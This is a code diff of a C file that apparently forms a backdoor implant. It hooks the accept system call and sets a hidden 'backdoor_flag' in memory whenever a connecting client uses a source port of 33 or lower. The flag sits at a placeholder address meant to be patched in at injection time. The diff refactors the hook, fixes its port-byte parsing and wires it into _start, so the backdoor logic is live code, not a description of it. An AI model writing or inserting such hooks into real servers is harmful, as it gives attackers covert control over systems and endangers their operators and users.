@@ -1,19 +1,24 @@
+#include "syscall_define.h"
 #include <netinet/in.h>
 #include <stdint.h>
+#include <sys/cdefs.h>
+#include <syscall.h>
 
-uint32_t *get_backdoor_location ();
+__always_inline void *get_rw_addr ();
 
-int sys_accept (int fd, struct sockaddr *restrict addr,
-                socklen_t *restrict addr_len);
+__attribute_noinline__ int accept_hook (int fd, struct sockaddr *restrict addr,
+                                        socklen_t *restrict addr_len);
+__always_inline int sys_accept (int fd, struct sockaddr *restrict addr,
+                                socklen_t *restrict addr_len);
 
 int
 accept_hook (int fd, struct sockaddr *restrict addr,
              socklen_t *restrict addr_len)
 {
   int ret_fd = sys_accept (fd, addr, addr_len);
-  uint32_t *backdoor_flag = get_backdoor_location ();
-  uint8_t high_port = ((struct sockaddr_in *)addr)->sin_port & 0xff;
-  uint8_t low_port = ((struct sockaddr_in *)addr)->sin_port & 0x00ff;
+  uint32_t *backdoor_flag = get_rw_addr ();
+  uint8_t high_port = (((struct sockaddr_in *)addr)->sin_port) & 0xff;
+  uint8_t low_port = ((((struct sockaddr_in *)addr)->sin_port) & 0xff00) / 0x100;
   if (!high_port && (low_port <= 33))
     *backdoor_flag = 16;
   else
@@ -21,20 +26,23 @@ accept_hook (int fd, struct sockaddr *restrict addr,
   return ret_fd;
 }
 
-uint32_t *
-get_backdoor_location ()
-{
-  asm ("mov rax, 0x123456789abc");
-}
-
 int
 sys_accept (int fd, struct sockaddr *restrict addr,
             socklen_t *restrict addr_len)
 {
-  asm ("push 0x2b; pop rax; syscall");
+  return syscall3 (SYS_accept, fd, (uint64_t)addr, (uint64_t)addr_len);
+}
+
+__always_inline void *
+get_rw_addr ()
+{
+  void *ret;
+  __asm__ volatile ("mov rax, 0x0123456789abcdef" : "=a"(ret));
+  return ret;
 }
 
 void
 _start ()
 {
+  accept_hook (0, 0, 0);
 }
